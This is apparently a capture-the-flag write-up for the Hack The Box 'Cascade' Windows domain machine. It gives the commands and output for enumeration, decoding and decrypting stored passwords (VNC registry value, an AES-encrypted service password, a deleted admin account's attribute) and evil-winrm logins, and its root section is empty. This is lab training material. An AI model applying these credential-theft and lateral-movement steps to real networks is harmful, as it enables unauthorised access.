# Cascade

Tags: AD-Win
Level: Medium
Status: Done
Date: January 15, 2024

### Nmap

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Cascade]
└─$ nmap -sC -sV -A -T4 -oN Cascade 10.10.10.182 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 15:27 EST
Nmap scan report for 10.10.10.182
Host is up (0.053s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-15 20:27:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-01-15T20:28:15
|_  start_date: 2024-01-15T20:25:17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.00 seconds
```

-SMB Enum

1. rpcclient - Users

### Enumeration

```jsx
>rpcclient -U "" -N 10.10.10.182
rpcclient $> enumdomusers
rpcclient $> querydispinfo (# NO information)
>crackmapexec smb 10.10.10.182 --shares 
>crackmapexec smb 10.10.10.182 -u '' -p '' --shares
>crackmapexec smb 10.10.10.182 -u '' --shares
#No Shares are revealed
>smbclient -U '' -L //10.10.10.182
>smbclient -L //10.10.10.182

>cat user | awk -F\[ '{print $2}' | awk -F\] '{print $1}' > users
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
>./windapsearch.py -U --full --dc-ip 10.10.10.182
# save the output in test file and search for pwd or password
>echo "clk0bjVldmE=" | base64 -d                                           
rY4n5eva 
>evil-winrm -i 10.10.10.182 -u r.thompson -p rY4n5eva
#Login failed which means powershell don't have remoting permission
>smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
>smbclient \\\\10.10.10.182\\Data -U r.thompson
#Identified ArkSvc, TempAdmin same original password
Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f in .reg file 
>evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
#Flag in User desktop
>Get-ADUser -identity s.smith -properties *
 vv
```

### User flag

```jsx

THe password identified in .reg file, decrypted using msfconsole

msfconsole -q
msf5 > irb
key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
true
Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
# password is sT333ve2

#Password found in above decryption
>evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
Enumerate users and groups

Their is encryption machanism

# decrypt.py
import pyaes
from base64 import b64decode
key = b"c4scadek3y654321"
iv = b"1tdyjCbY1Ix49842"
aes = pyaes.AESModeOfOperationCBC(key, iv = iv)
decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
print(decrypted.decode())
# decrypt.py
>python3 decrypt.py
w3lc0meFr31nd

>evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd
>Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
>Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -
IncludeDeletedObjects
>Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)
(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
>echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d                                   
baCT3r1aN00dles 
>evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles
```

### Root flag